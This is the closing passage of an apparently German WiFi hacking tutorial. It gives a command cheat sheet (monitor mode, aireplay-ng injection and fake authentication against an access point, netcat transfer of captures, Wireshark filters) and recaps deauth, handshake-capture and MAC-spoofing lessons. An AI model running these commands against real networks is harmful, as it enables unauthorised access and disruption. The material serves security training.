# Verbose Mode (debugging)
kismet -c wlan0 --verbose

# REST API Abfrage
curl -u user:pass http://<FLIPPER_IP>:2501/system/status.json
curl -u user:pass http://<FLIPPER_IP>:2501/devices/summary/devices.json

# Database Export
kismetdb_dump_devices --in /tmp/kismet/Kismet-*.kismet --json > devices.json
```

### Monitor Mode Management

```bash
# Monitor Mode aktivieren
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# Kanal setzen
iw dev wlan0 set channel <CH>

# Kanal + HT40 (40MHz wide channel)
iw dev wlan0 set freq 2437 HT40+

# Managed Mode zurück
ip link set wlan0 down
iw dev wlan0 set type managed
ip link set wlan0 up

# Status prüfen
iw dev wlan0 info
```

### Packet Injection Testing

```bash
# Test ob Injection funktioniert
aireplay-ng --test wlan0

# Test gegen spezifischen AP
aireplay-ng --test wlan0 -a <AP_MAC>

# Fake Authentication (für bestimmte Attacks nötig)
aireplay-ng --fakeauth 0 -a <AP_MAC> -h <YOUR_MAC> wlan0
```

### File Transfer

```bash
# HTTP Server (Python)
cd /tmp/captures
python3 -m http.server 8080
# Browser: http://<FLIPPER_IP>:8080

# Netcat Transfer
# Sender (Flipper):
nc -l -p 9999 < file.cap
# Empfänger (PC):
nc <FLIPPER_IP> 9999 > file.cap

# Busybox HTTP
busybox httpd -p 8080 -h /tmp/captures
```

### Wireshark Display Filters

```bash
# EAPOL (Handshakes)
eapol

# Deauth Frames
wlan.fc.type_subtype == 0x0c

# Beacon Frames
wlan.fc.type_subtype == 0x08

# Probe Requests
wlan.fc.type_subtype == 0x04

# Probe Responses
wlan.fc.type_subtype == 0x05

# Spezifisches Netzwerk
wlan.bssid == aa:bb:cc:dd:ee:ff

# Spezifischer Client
wlan.addr == 11:22:33:44:55:66

# Management Frames
wlan.fc.type == 0

# Data Frames
wlan.fc.type == 2
```

---

## Zusammenfassung Teil 2

Du hast jetzt gelernt:

✅ **Deauthentication Attacks:**
- Theorie des 802.11 Deauth Frames
- Gezielte und Broadcast Deauths
- Handshake-Capturing erzwingen
- DoS-Testing

✅ **WPA Handshake Capturing:**
- 4-Way-Handshake Theorie
- Multi-Terminal Capture Setup
- Handshake-Verifizierung
- Format-Konvertierung für Cracking-Tools

✅ **Active Probing:**
- Hidden SSID Aufdeckung forciert
- Probe Request/Response Manipulation
- Beacon Injection
- Fake APs erstellen

✅ **MAC Spoofing:**
- Hardware-Adresse ändern
- MAC-Filter umgehen
- Vendor-Spoofing
- Detection-Methoden

✅ **Nmap WiFi Integration:**
- Host Discovery in WLANs
- Port Scanning über WiFi
- Service Detection
- Network Auditing

✅ **Erweiterte Techniken:**
- Kismet REST API
- GPS Wardriving
- Alert-Konfiguration
- Injection Testing

### Was kommt in Teil 3?

**Attack Scenarios (Offensive Security):**
- Evil Twin APs (Fake Access Points)
- MITM (Man-in-the-Middle) Attacks
- Credential Harvesting (Captive Portal)
- WPA2 Handshake Cracking (aircrack-ng, hashcat)
- WPS PIN Attacks
- Karma/Mana Attacks
- SSL Stripping
- DNS Spoofing over WiFi

### Wichtige Erinnerung ⚠️

Alle Techniken in Teil 2 sind **detektierbar** und können als **Angriff** interpretiert werden:

- Nur in autorisierten Umgebungen!
- Dokumentiere deine Tests
- Informiere andere Nutzer
- Befolge lokale Gesetze

**Active Reconnaissance ist der Übergang von Recon zu Attack - handle verantwortungsvoll!**

---

## Hilfreiche Ressourcen

**Tools:**
- Aircrack-ng Suite: https://www.aircrack-ng.org/
- Kismet: https://www.kismetwireless.net/
- Nmap: https://nmap.org/
- Wireshark: https://www.wireshark.org/

**Learning:**
- WiFi Hacking Labs: https://tryhackme.com
- OSWP Certification: https://www.offensive-security.com/
- WiFi Hacking Challenges: https://www.hackthebox.eu/

**Documentation:**
- 802.11 Standard: https://standards.ieee.org/
- WPA2 4-Way Handshake: https://www.wifi-professionals.com/

---

**Bereit für die Attacks in Teil 3? 🔥**

**Fragen zu Teil 2? Lass es mich wissen!**
